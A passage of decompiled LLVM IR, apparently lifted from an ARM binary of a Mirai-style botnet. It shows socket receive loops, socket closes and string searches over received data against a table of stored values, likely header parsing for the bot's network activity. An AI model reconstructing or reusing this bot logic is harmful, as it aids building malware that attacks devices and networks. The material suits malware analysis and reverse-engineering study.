  %storemerge6 = phi i32 [ %v1_9488, %dec_label_pc_946c ], [ %storemerge6.pre, %dec_label_pc_9438 ]
  store i32 %storemerge6, i32* %stack_var_-44, align 4
  store i32 %v0_9474, i32* %r0.global-to-local, align 4
  %v1_9478 = inttoptr i32 %v0_9474 to i8*
  %v2_9478 = call i32 @util_strlen(i8* %v1_9478)
  store i32 %v2_9478, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9480 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9480, i32* %r4.global-to-local, align 4
  %v3_9484 = icmp uge i32 %v2_9478, %v3_9480
  store i1 %v3_9484, i1* %cpsr_c.global-to-local, align 1
  %v9_9484 = icmp eq i32 %v2_9478, %v3_9480
  store i1 %v9_9484, i1* %cpsr_z.global-to-local, align 1
  %v1_9488 = add i32 %v3_9480, 1
  store i32 %v1_9488, i32* %ip.global-to-local, align 4
  %v8_948c = icmp sgt i32 %v2_9478, %v3_9480
  %v0_9460 = load i32, i32* @r5, align 4
  %v2_9460 = add i32 %v0_9460, %v3_9480
  %v3_9460 = inttoptr i32 %v2_9460 to i8*
  %v4_9460 = load i8, i8* %v3_9460, align 1
  %v6_9460 = zext i8 %v4_9460 to i32
  store i32 %v6_9460, i32* %r3.global-to-local, align 4
  %v2_9464 = icmp ugt i8 %v4_9460, 60
  store i1 %v2_9464, i1* %cpsr_c.global-to-local, align 1
  %v7_9464 = icmp eq i8 %v4_9460, 61
  store i1 %v7_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_948c, label %dec_label_pc_9460, label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_949c

dec_label_pc_949c:                                ; preds = %dec_label_pc_94e8, %dec_label_pc_950c, %dec_label_pc_9490, %bb195
  %v0_949c = load i32, i32* @r8, align 4
  store i32 %v0_949c, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_94a4:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9490
  %v0_94a4 = load i32, i32* @sl, align 4
  %v1_94a4 = add i32 %v0_94a4, 16
  %v2_94a4 = inttoptr i32 %v1_94a4 to i32*
  %v3_94a4 = load i32, i32* %v2_94a4, align 4
  store i32 %v3_94a4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_94b0 = icmp eq i32 %v3_94a4, 0
  store i1 %v2_94b0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %tmp199 = icmp slt i32 %v3_94a4, 1
  br i1 %tmp199, label %dec_label_pc_950c, label %dec_label_pc_94bc

dec_label_pc_94bc:                                ; preds = %dec_label_pc_94a4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94c4:                                ; preds = %dec_label_pc_94e8
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_94c8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94c8, i32* %r3.global-to-local, align 4
  %v0_94cc = load i32, i32* @sl, align 4
  %v1_94cc = add i32 %v0_94cc, 16
  %v2_94cc = inttoptr i32 %v1_94cc to i32*
  %v3_94cc = load i32, i32* %v2_94cc, align 4
  %v1_94d0 = add i32 %v3_94c8, 1
  store i32 %v1_94d0, i32* %ip.global-to-local, align 4
  %v3_94d4 = icmp uge i32 %v3_94cc, %v1_94d0
  store i1 %v3_94d4, i1* %cpsr_c.global-to-local, align 1
  %v9_94d4 = icmp eq i32 %v3_94cc, %v1_94d0
  store i1 %v9_94d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v1_94d0, i32* %r1.global-to-local, align 4
  store i32 %v1_94d0, i32* %stack_var_-44, align 4
  %v7_94e4 = icmp sgt i32 %v3_94cc, %v1_94d0
  %v0_94f4.pre = load i32, i32* @r5, align 4
  br i1 %v7_94e4, label %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, label %dec_label_pc_950c

dec_label_pc_94c4.dec_label_pc_94e8_crit_edge:    ; preds = %dec_label_pc_94c4
  %v0_94f8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_94e8

dec_label_pc_94e8:                                ; preds = %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge, %dec_label_pc_94bc
  %v0_94f8 = phi i32 [ %v0_94f8.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v3_9480, %dec_label_pc_94bc ]
  %v0_94f4 = phi i32 [ %v0_94f4.pre, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ %v0_9460, %dec_label_pc_94bc ]
  %v0_94e8 = phi i32 [ %v1_94d0, %dec_label_pc_94c4.dec_label_pc_94e8_crit_edge ], [ 0, %dec_label_pc_94bc ]
  %v1_94e8 = and i32 %v0_94e8, 33554432
  %v2_94e8 = icmp ne i32 %v1_94e8, 0
  store i1 %v2_94e8, i1* %cpsr_c.global-to-local, align 1
  %v3_94e8 = mul i32 %v0_94e8, 128
  %v1_94ec = add i32 %v3_94e8, 1472
  %v0_94f0 = load i32, i32* %sb.global-to-local, align 4
  %v2_94f0 = add i32 %v1_94ec, %v0_94f0
  store i32 %v2_94f0, i32* %r1.global-to-local, align 4
  store i32 %v0_94f4, i32* %r0.global-to-local, align 4
  store i32 %v0_94f8, i32* %r2.global-to-local, align 4
  %v3_94fc = inttoptr i32 %v0_94f4 to i8*
  %v4_94fc = call i32 @util_strncmp(i8* %v3_94fc, i32 %v2_94f0, i32 %v0_94f8)
  store i32 %v4_94fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9500 = icmp eq i32 %v4_94fc, 0
  store i1 %v2_9500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9500, label %dec_label_pc_94c4, label %dec_label_pc_949c

dec_label_pc_950c:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_94a4
  %v0_950c = phi i32 [ %v0_9460, %dec_label_pc_94a4 ], [ %v0_94f4.pre, %dec_label_pc_94c4 ]
  store i32 %v0_950c, i32* %r0.global-to-local, align 4
  %v1_9510 = inttoptr i32 %v0_950c to i8*
  %v2_9510 = call i32 @util_strlen(i8* %v1_9510)
  store i32 %v2_9510, i32* %r0.global-to-local, align 4
  %v2_9514 = icmp ugt i32 %v2_9510, 126
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  %v7_9514 = icmp eq i32 %v2_9510, 127
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  %v8_9518 = icmp sgt i32 %v2_9510, 127
  br i1 %v8_9518, label %dec_label_pc_949c, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_950c
  %v0_951c = load i32, i32* @sl, align 4
  %v1_951c = add i32 %v0_951c, 16
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  %v1_9520 = and i32 %v3_951c, 33554432
  %v2_9520 = icmp ne i32 %v1_9520, 0
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
  %v3_9520 = mul i32 %v3_951c, 128
  %v1_9524 = add i32 %v3_9520, 1472
  %v0_9528 = load i32, i32* @r5, align 4
  store i32 %v0_9528, i32* %r1.global-to-local, align 4
  %v0_952c = load i32, i32* %sb.global-to-local, align 4
  %v2_952c = add i32 %v1_9524, %v0_952c
  store i32 %v2_952c, i32* @r0, align 4
  %v2_9530 = inttoptr i32 %v2_952c to i8*
  %v3_9530 = call i32 @util_strcpy(i8* %v2_9530, i32 %v0_9528)
  store i32 %v3_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @sl, align 4
  %v1_9534 = add i32 %v0_9534, 16
  %v2_9534 = inttoptr i32 %v1_9534 to i32*
  %v3_9534 = load i32, i32* %v2_9534, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  store i32 %v0_9538, i32* @r5, align 4
  %v1_953c = add i32 %v3_9534, 1
  store i32 %v1_953c, i32* %r3.global-to-local, align 4
  store i32 %v1_953c, i32* %v2_9534, align 4
  %v1_935c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9548:                                ; preds = %dec_label_pc_9668
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_954c = load i32, i32* @r4, align 4
  %v2_954c = inttoptr i32 %v1_954c to i32*
  store i32 104, i32* %v2_954c, align 4
  br label %dec_label_pc_9550

dec_label_pc_9550:                                ; preds = %dec_label_pc_9694, %dec_label_pc_9028, %dec_label_pc_9548
  %v0_9550 = load i32, i32* @sl, align 4
  %v1_9550 = add i32 %v0_9550, -1452
  %v2_9550 = inttoptr i32 %v1_9550 to i32*
  %v3_9550 = load i32, i32* %v2_9550, align 4
  store i32 %v3_9550, i32* %r0.global-to-local, align 4
  %v1_9554 = call i32 @__GI___libc_close(i32 %v3_9550)
  store i32 %v1_9554, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9560 = load i32, i32* @sl, align 4
  %v2_9560 = add i32 %v1_9560, -1452
  %v3_9560 = inttoptr i32 %v2_9560 to i32*
  store i32 -1, i32* %v3_9560, align 4
  %v0_9564 = load i32, i32* %r2.global-to-local, align 4
  %v1_9564 = trunc i32 %v0_9564 to i8
  %v2_9564 = load i32, i32* @sl, align 4
  %v3_9564 = add i32 %v2_9564, -1448
  %v4_9564 = inttoptr i32 %v3_9564 to i8*
  store i8 %v1_9564, i8* %v4_9564, align 1
  br label %dec_label_pc_87ec

dec_label_pc_956c:                                ; preds = %dec_label_pc_85d4
  store i32 %v1_85d4, i32* %r3.global-to-local, align 4
  %v1_9570 = trunc i32 %v1_85d4 to i8
  store i8 %v1_9570, i8* %v2_860c, align 1
  %v0_9574 = load i32, i32* @r6, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i32*
  %v3_9574 = load i32, i32* %v2_9574, align 4
  store i32 %v3_9574, i32* %r0.global-to-local, align 4
  %v1_9578 = call i32 @__GI___libc_close(i32 %v3_9574)
  store i32 %v1_9578, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9580 = load i32, i32* @r6, align 4
  %v2_9580 = add i32 %v1_9580, -1452
  %v3_9580 = inttoptr i32 %v2_9580 to i32*
  store i32 -1, i32* %v3_9580, align 4
  br label %dec_label_pc_85f4

dec_label_pc_9588:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9350
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v3_9590 = call i32 @table_retrieve_val(i32 41, i32* null)
  %v0_9594 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9594, i32* @r1, align 4
  store i32 %v3_9590, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95a0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9594, i32 %v3_9590)
  store i32 %v4_95a0, i32* %r0.global-to-local, align 4
  %v2_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v2_95a4, i1* %cpsr_c.global-to-local, align 1
  %v7_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v7_95a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95a4, label %dec_label_pc_9718, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 41, i32* %r0.global-to-local, align 4
  %v3_95b4 = call i32 @table_retrieve_val(i32 41, i32* null)
  %v0_95b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_95b8, i32* @r1, align 4
  store i32 %v3_95b4, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95c4 = call i32 @util_stristr(i8* %tmp168, i32 %v0_95b8, i32 %v3_95b4)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_95cc = add i32 %v4_95c4, %v2_827c
  %v3_95cc = inttoptr i32 %v2_95cc to i8*
  %v4_95cc = load i8, i8* %v3_95cc, align 1
  %v2_95d4 = icmp ugt i8 %v4_95cc, 31
  store i1 %v2_95d4, i1* %cpsr_c.global-to-local, align 1
  %v7_95d4 = icmp eq i8 %v4_95cc, 32
  store i1 %v7_95d4, i1* %cpsr_z.global-to-local, align 1
  %v2_95dc = zext i1 %v7_95d4 to i32
  %v2_95dc.v4_95c4 = add i32 %v2_95dc, %v4_95c4
  store i32 %v2_95dc.v4_95c4, i32* @r4, align 4
  %v2_95e0 = add i32 %v2_95dc.v4_95c4, %v2_827c
  store i32 %v2_95e0, i32* @r6, align 4
  store i32 %v2_95e0, i32* %r0.global-to-local, align 4
  %v1_95e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_95e8 = sub i32 %v1_95e8, %v2_95dc.v4_95c4
  store i32 %v2_95e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95f4 = call i32 @util_memsearch(i32 %v2_95e0, i32 %v2_95e8, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_95f4, i32* %r0.global-to-local, align 4
  %v2_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v2_95f8, i1* %cpsr_c.global-to-local, align 1
  %v7_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v7_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95f8, label %dec_label_pc_9718, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ac
  %v2_9600 = icmp ne i32 %v5_95f4, 0
  store i1 %v2_9600, i1* %cpsr_c.global-to-local, align 1
  %v7_9600 = icmp eq i32 %v5_95f4, 1
  store i1 %v7_9600, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9608 = icmp slt i32 %v5_95f4, 2
  br i1 %v7_9608, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_9600
  %v9_9608 = add i32 %v5_95f4, -2
  store i32 %v9_9608, i32* %r0.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_9600, %bb200
  %v1_9610 = phi i32 [ %v5_95f4, %dec_label_pc_9600 ], [ %v9_9608, %bb200 ]
  %v2_9610 = add i32 %v1_9610, %v2_8710
  store i32 -20773, i32* @lr, align 4
  %v1_9618 = add i32 %v1_9610, 1
  store i32 %v1_9618, i32* @r5, align 4
  %v1_961c = load i32, i32* @r4, align 4
  %v2_961c = add i32 %v2_9610, %v1_961c
  store i32 %v2_961c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9624 = load i32, i32* @r6, align 4
  store i32 %v0_9624, i32* %r0.global-to-local, align 4
  store i32 %v1_9618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b38c.53 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9634 = add i32 %v2_961c, -20773
  %v5_9634 = inttoptr i32 %v4_9634 to i8*
  store i8 0, i8* %v5_9634, align 1
  %v5_9638 = call i32 @util_memsearch(i32 %v0_9624, i32 %v1_9618, i32 ptrtoint ([5 x i8]* @global_var_1b38c.53 to i32), i32 4)
  store i32 %v5_9638, i32* %r0.global-to-local, align 4
  %v2_963c = icmp ugt i32 %v5_9638, 3
  store i1 %v2_963c, i1* %cpsr_c.global-to-local, align 1
  %v7_963c = icmp eq i32 %v5_9638, 4
  store i1 %v7_963c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_963c, label %dec_label_pc_9a00, label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %bb201
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_9648 = load i32, i32* @r4, align 4
  %v2_9648 = add i32 %v1_9648, %v2_827c
  %v3_9648 = inttoptr i32 %v2_9648 to i8*
  %v4_9648 = load i8, i8* %v3_9648, align 1
  %v6_9648 = zext i8 %v4_9648 to i32
  store i32 %v6_9648, i32* %r3.global-to-local, align 4
  %v2_964c = icmp ugt i8 %v4_9648, 46
  store i1 %v2_964c, i1* %cpsr_c.global-to-local, align 1
  %v7_964c = icmp eq i8 %v4_9648, 47
  store i1 %v7_964c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_964c, label %dec_label_pc_9c00, label %dec_label_pc_9654

dec_label_pc_9654:                                ; preds = %dec_label_pc_96a0, %dec_label_pc_9c30, %dec_label_pc_9c00, %dec_label_pc_9ad0, %dec_label_pc_9ab4, %dec_label_pc_9644, %dec_label_pc_9c48, %dec_label_pc_9afc
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9658 = load i32, i32* @sl, align 4
  %v3_9658 = add i32 %v2_9658, -1448
  %v4_9658 = inttoptr i32 %v3_9658 to i8*
  store i8 1, i8* %v4_9658, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9660:                                ; preds = %dec_label_pc_87e4
  %v0_9660 = call i32 @__GI___errno_location()
  store i32 %v0_9660, i32* %r0.global-to-local, align 4
  store i32 %v0_9660, i32* @r4, align 4
  br label %dec_label_pc_9668

dec_label_pc_9668:                                ; preds = %dec_label_pc_968c, %dec_label_pc_9660
  %v1_966c = phi i32 [ %v0_9660, %dec_label_pc_9660 ], [ %v0_9694, %dec_label_pc_968c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_966c = inttoptr i32 %v1_966c to i32*
  store i32 0, i32* %v2_966c, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v0_9674 = load i32, i32* @sl, align 4
  %v1_9674 = add i32 %v0_9674, -1452
  %v2_9674 = inttoptr i32 %v1_9674 to i32*
  %v3_9674 = load i32, i32* %v2_9674, align 4
  store i32 %v3_9674, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_967c = load i32, i32* %r3.global-to-local, align 4
  %v1_967c = add i32 %v0_967c, 16384
  store i32 %v1_967c, i32* %r3.global-to-local, align 4
  %v4_9680 = call i32 @__libc_recv(i32 %v3_9674, i32 %v2_827c, i32 10240, i32 %v1_967c)
  store i32 %v4_9680, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9684 = icmp eq i32 %v4_9680, 0
  store i1 %v2_9684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9684, label %dec_label_pc_9548, label %dec_label_pc_968c

dec_label_pc_968c:                                ; preds = %dec_label_pc_9668
  %v3_968c = icmp eq i32 %v4_9680, -1
  store i1 %v3_968c, i1* %cpsr_c.global-to-local, align 1
  %v8_968c = icmp eq i32 %v4_9680, -1
  store i1 %v8_968c, i1* %cpsr_z.global-to-local, align 1
  %v0_9694 = load i32, i32* @r4, align 4
  br i1 %v3_968c, label %dec_label_pc_9694, label %dec_label_pc_9668

dec_label_pc_9694:                                ; preds = %dec_label_pc_968c
  %v1_9694 = inttoptr i32 %v0_9694 to i32*
  %v2_9694 = load i32, i32* %v1_9694, align 4
  store i32 %v2_9694, i32* %r3.global-to-local, align 4
  %v2_9698 = icmp ugt i32 %v2_9694, 10
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v2_9694, 11
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9698, label %dec_label_pc_96a0, label %dec_label_pc_9550

dec_label_pc_96a0:                                ; preds = %dec_label_pc_9694
  %v0_96a0 = load i32, i32* @sl, align 4
  %v1_96a0 = add i32 %v0_96a0, -1448
  %v2_96a0 = inttoptr i32 %v1_96a0 to i8*
  %v3_96a0 = load i8, i8* %v2_96a0, align 1
  %v4_96a0 = zext i8 %v3_96a0 to i32
  store i32 %v4_96a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_96a4 = icmp eq i8 %v3_96a0, 0
  store i1 %v2_96a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_96a4, label %dec_label_pc_87ec, label %dec_label_pc_9654

dec_label_pc_96b0:                                ; preds = %dec_label_pc_8df4
  %v0_96b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96b0 = add i32 %v0_96b0, 1
  store i32 %v1_96b0, i32* %r3.global-to-local, align 4
  %v1_96b4 = trunc i32 %v1_96b0 to i8
  %v2_96b4 = load i32, i32* @sl, align 4
  %v3_96b4 = add i32 %v2_96b4, -1448
  %v4_96b4 = inttoptr i32 %v3_96b4 to i8*
  store i8 %v1_96b4, i8* %v4_96b4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96bc:                                ; preds = %dec_label_pc_8c6c
  %v0_96bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96bc, i32* @r0, align 4
  %v0_96c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_96c0, i32* %r1.global-to-local, align 4
  %v2_96c4 = inttoptr i32 %v0_96bc to i8*
  %v3_96c4 = call i32 @util_strcpy(i8* %v2_96c4, i32 %v0_96c0)
  store i32 %v3_96c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c84

dec_label_pc_96cc:                                ; preds = %dec_label_pc_8d74
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_96d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_96d0 = inttoptr i32 %v1_96d0 to i32*
  store i32 104, i32* %v2_96d0, align 4
  %v0_96d4 = load i32, i32* @sl, align 4
  %v1_96d4 = add i32 %v0_96d4, -1452
  %v2_96d4 = inttoptr i32 %v1_96d4 to i32*
  %v3_96d4 = load i32, i32* %v2_96d4, align 4
  store i32 %v3_96d4, i32* %r0.global-to-local, align 4
  %v1_96d8 = call i32 @__GI___libc_close(i32 %v3_96d4)
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96e4 = load i32, i32* @sl, align 4
  %v2_96e4 = add i32 %v1_96e4, -1452
  %v3_96e4 = inttoptr i32 %v2_96e4 to i32*
  store i32 -1, i32* %v3_96e4, align 4
  %v0_96e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i8
  %v2_96e8 = load i32, i32* @sl, align 4
  %v3_96e8 = add i32 %v2_96e8, -1448
  %v4_96e8 = inttoptr i32 %v3_96e8 to i8*
  store i8 %v1_96e8, i8* %v4_96e8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96f0:                                ; preds = %dec_label_pc_8d9c
  %v0_96f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_96f0 = inttoptr i32 %v0_96f0 to i32*
  %v2_96f0 = load i32, i32* %v1_96f0, align 4
  store i32 %v2_96f0, i32* %r3.global-to-local, align 4
  %v2_96f4 = icmp ugt i32 %v2_96f0, 10
  store i1 %v2_96f4, i1* %cpsr_c.global-to-local, align 1
  %v7_96f4 = icmp eq i32 %v2_96f0, 11
  store i1 %v7_96f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96f4, label %dec_label_pc_87ec, label %dec_label_pc_96fc

dec_label_pc_96fc:                                ; preds = %dec_label_pc_96f0
  %v0_96fc = load i32, i32* @sl, align 4
  %v1_96fc = add i32 %v0_96fc, -1452
  %v2_96fc = inttoptr i32 %v1_96fc to i32*
  %v3_96fc = load i32, i32* %v2_96fc, align 4
  store i32 %v3_96fc, i32* %r0.global-to-local, align 4
  %v1_9700 = call i32 @__GI___libc_close(i32 %v3_96fc)
  store i32 %v1_9700, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_970c = load i32, i32* @sl, align 4
  %v2_970c = add i32 %v1_970c, -1452
  %v3_970c = inttoptr i32 %v2_970c to i32*
  store i32 -1, i32* %v3_970c, align 4
  %v0_9710 = load i32, i32* %r2.global-to-local, align 4
  %v1_9710 = trunc i32 %v0_9710 to i8
  %v2_9710 = load i32, i32* @sl, align 4
  %v3_9710 = add i32 %v2_9710, -1448
  %v4_9710 = inttoptr i32 %v3_9710 to i8*
  store i8 %v1_9710, i8* %v4_9710, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9718:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_9720 = call i32 @table_retrieve_val(i32 40, i32* null)
  %v0_9724 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9724, i32* @r1, align 4
  store i32 %v3_9720, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9730 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9724, i32 %v3_9720)
  store i32 %v4_9730, i32* %r0.global-to-local, align 4
  %v2_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v2_9738, i1* %cpsr_c.global-to-local, align 1
  %v7_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v7_9738, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9738, label %dec_label_pc_9938, label %dec_label_pc_9744

dec_label_pc_9744:                                ; preds = %dec_label_pc_9718
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v3_974c = call i32 @table_retrieve_val(i32 40, i32* null)
  %v0_9750 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9750, i32* @r1, align 4
  store i32 %v3_974c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_975c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9750, i32 %v3_974c)
  store i32 %v4_975c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9764 = add i32 %v4_975c, %v2_827c
  %v3_9764 = inttoptr i32 %v2_9764 to i8*
  %v4_9764 = load i8, i8* %v3_9764, align 1
  %v2_976c = icmp ugt i8 %v4_9764, 31
  store i1 %v2_976c, i1* %cpsr_c.global-to-local, align 1
  %v7_976c = icmp eq i8 %v4_9764, 32
  store i1 %v7_976c, i1* %cpsr_z.global-to-local, align 1
  %v2_9774 = zext i1 %v7_976c to i32
  %v2_9774.v4_975c = add i32 %v2_9774, %v4_975c
  store i32 %v2_9774.v4_975c, i32* @r4, align 4
  %v2_9778 = add i32 %v2_9774.v4_975c, %v2_827c
  store i32 %v2_9778, i32* @r5, align 4
  store i32 %v2_9778, i32* %r0.global-to-local, align 4
  %v1_9780 = load i32, i32* %fp.global-to-local, align 4
  %v2_9780 = sub i32 %v1_9780, %v2_9774.v4_975c
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_978c = call i32 @util_memsearch(i32 %v2_9778, i32 %v2_9780, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_978c, i32* %r0.global-to-local, align 4
  %v2_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v2_9790, i1* %cpsr_c.global-to-local, align 1
  %v7_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_978c, i32* @r7, align 4
  br i1 %v7_9790, label %dec_label_pc_9938, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_9744
  %v2_979c = icmp ne i32 %v5_978c, 0
  store i1 %v2_979c, i1* %cpsr_c.global-to-local, align 1
  %v7_979c = icmp eq i32 %v5_978c, 1
  store i1 %v7_979c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_97a4 = icmp slt i32 %v5_978c, 2
  br i1 %v7_97a4, label %bb203, label %bb202

bb202:                                            ; preds = %dec_label_pc_979c
  %v9_97a4 = add i32 %v5_978c, -2
  store i32 %v9_97a4, i32* @r7, align 4
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_979c, %bb202
  %v1_97ac = phi i32 [ %v5_978c, %dec_label_pc_979c ], [ %v9_97a4, %bb202 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_97ac = add i32 %v1_97ac, %v2_8710
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_97b4 = load i32, i32* @r4, align 4
  %v2_97b4 = add i32 %v2_97ac, %v1_97b4
  store i32 %v2_97b4, i32* %r2.global-to-local, align 4
  %v3_97b8 = load i32, i32* @r6, align 4
  %v4_97b8 = add i32 %v3_97b8, %v2_97b4
  %v5_97b8 = inttoptr i32 %v4_97b8 to i8*
  store i8 0, i8* %v5_97b8, align 1
  store i32 %v10_82f0, i32* @lr, align 4
  %v0_97c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_97c0, i32* %stack_var_-44, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_97c8 = load i32, i32* @r4, align 4
  %v2_97c8 = add i32 %v1_97c8, %v2_827c
